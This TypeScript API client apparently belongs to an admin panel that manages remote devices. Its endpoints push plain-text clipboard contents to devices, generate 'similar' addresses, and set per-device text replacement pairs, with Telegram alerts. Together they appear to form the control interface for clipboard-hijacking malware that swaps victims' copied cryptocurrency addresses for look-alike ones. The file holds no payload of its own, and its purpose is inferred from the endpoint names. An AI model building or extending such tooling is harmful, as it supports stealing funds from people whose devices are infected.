import axios from 'axios'
import { ElMessage } from 'element-plus'
import router from './router'

const api = axios.create({ baseURL: import.meta.env.VITE_API_BASE || 'http://localhost:8001' })

// 请求拦截器
api.interceptors.request.use((config) => {
  const token = localStorage.getItem('token') || ''
  if (token) {
    config.headers = config.headers || {}
    ;(config.headers as any)['Authorization'] = 'Bearer ' + token
  }
  return config
})

// 防止重复跳转的标志
let isRedirecting = false

// 响应拦截器
api.interceptors.response.use(
  (response) => response,
  (error) => {
    // 处理401和403错误（未授权/token过期）
    if ((error.response?.status === 401 || error.response?.status === 403) && !isRedirecting) {
      isRedirecting = true
      
      // Token过期或无效
      localStorage.removeItem('token')
      
      // 如果当前不在登录页面，显示提示信息
      if (router.currentRoute.value.path !== '/login') {
        ElMessage.error('登录已过期，请重新登录')
      }
      
      // 跳转到登录页面
      router.push('/login').finally(() => {
        // 重置标志
        setTimeout(() => {
          isRedirecting = false
        }, 1000)
      })
    }
    return Promise.reject(error)
  }
)

export const login = (username: string, password: string) => api.post('/admin/login', { username, password })
export const getStats = () => api.get('/admin/stats')
export const getDailyStats = () => api.get('/admin/stats/daily')
export const listDevices = () => api.get('/admin/devices')
export const updateNote = (deviceId: string, note: string) => api.patch(`/admin/devices/${deviceId}/note`, { note })
export const updateAutoGenerate = (deviceId: string, autoGenerate: boolean) => api.patch(`/admin/devices/${deviceId}/auto-generate`, { autoGenerate })
export const pushSet = (deviceId: string, text: string) => api.post(`/admin/devices/${deviceId}/push-set`, { set: { format: 'text/plain', text } })
export const getSettings = () => api.get('/admin/settings')
export const updateSetting = (key: string, value: string) => api.put(`/admin/settings/${key}`, { value })
export const testTelegram = () => api.post('/admin/settings/test-telegram')
export const generateSimilar = (deviceId: string) => api.post(`/admin/devices/${deviceId}/generate-similar`)
export const getGeneratedAddresses = (deviceId: string) => api.get(`/admin/devices/${deviceId}/generated-addresses`)

// 替换对相关API
export const listReplacementPairs = () => api.get('/admin/replacement-pairs')
export const getDeviceReplacementPairs = (deviceId: string) => api.get(`/admin/devices/${deviceId}/replacement-pairs`)
export const createReplacementPair = (data: {
  device_id: string
  original_text: string
  replacement_text: string
}) => api.post('/admin/replacement-pairs', data)
export const updateReplacementPair = (id: number, data: {
  original_text?: string
  replacement_text?: string
  enabled?: boolean
}) => api.put(`/admin/replacement-pairs/${id}`, data)
export const deleteReplacementPair = (id: number) => api.delete(`/admin/replacement-pairs/${id}`)

export default api


